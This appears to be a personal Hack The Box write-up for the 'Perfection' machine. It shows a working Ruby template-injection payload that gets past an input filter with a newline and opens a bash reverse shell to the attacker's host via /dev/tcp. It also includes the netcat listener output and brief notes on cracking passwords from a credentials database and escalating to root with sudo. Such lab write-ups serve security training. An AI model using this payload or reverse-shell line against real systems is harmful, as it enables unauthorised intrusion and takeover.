---
{"dg-publish":true,"permalink":"/personal-site/completed-writeups/htb/perfection/","tags":["#linux","#ssti","#ruby","#password_cracking"]}
---


# 10.10.11.253
---
# Enumeration &  Recon
```bash
22
80
```



# Exploitation
ssti payload bypassed with newline (%0a)
```http
POST /weighted-grade-calc HTTP/1.1
Host: 10.10.11.253
Content-Length: 246
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.11.253
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.11.253/weighted-grade
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: keep-alive

category1=asdf%0a<%25%3d+`bash+-c+"bash+-i+>%26+/dev/tcp/10.10.16.3/4451+0>%261"`+%25>&grade1=1&weight1=20&category2=fdsa&grade2=1&weight2=20&category3=qwer&grade3=1&weight3=20&category4=zxcv&grade4=1&weight4=20&category5=jklh&grade5=1&weight5=20
```

```bash
nc -lvvp 4451
Listening on any address 4451 (ctisystemmsg)
Connection from 10.10.11.253:48858
bash: cannot set terminal process group (986): Inappropriate ioctl for device
bash: no job control in this shell
susan@perfection:~/ruby_app$ whoami
whoami
susan
susan@perfection:~/ruby_app$ which python3
which python3
/usr/bin/python3
susan@perfection:~/ruby_app$
```
# Post Exploitation
- susan home dir has Migration/pupilpath_credentials.db
- locate mail -> `/var/spool/mail` gives password format
- hashcat mask attack password crack
- check sudo -l
- all commands available
- sudo su => root shell

